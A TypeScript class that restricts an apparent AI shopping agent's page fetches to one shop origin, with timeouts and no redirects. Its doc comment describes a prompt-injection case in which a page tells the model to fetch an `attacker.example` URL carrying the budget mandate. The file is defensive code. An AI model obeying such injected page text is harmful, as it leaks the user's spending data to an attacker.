const TIMEOUT_MS = 5_000;
const MAX_PAGE_CHARS = 100_000;

export interface PageSource {
  read: (url: string) => Promise<string>;
}

/**
 * Reads pages on one shop only. Without this limit a page could tell the model to fetch
 * `attacker.example/?budget=...` and leak the mandate with no payment at all.
 */
export class ShopPageSource implements PageSource {
  private readonly origin: string;

  constructor(
    shopUrl: string,
    private readonly fetcher: typeof fetch = globalThis.fetch,
  ) {
    this.origin = new URL(shopUrl).origin;
  }

  async read(url: string) {
    if (typeof url !== 'string') throw new Error('url must be a string');

    const target = new URL(url, this.origin);
    if (target.origin !== this.origin) throw new Error(`${url} is outside the shop`);

    const response = await this.fetcher(target.href, {
      redirect: 'error',
      signal: AbortSignal.timeout(TIMEOUT_MS),
    });
    if (!response.ok) throw new Error(`${url} returned ${response.status}`);
    return (await response.text()).slice(0, MAX_PAGE_CHARS);
  }
}
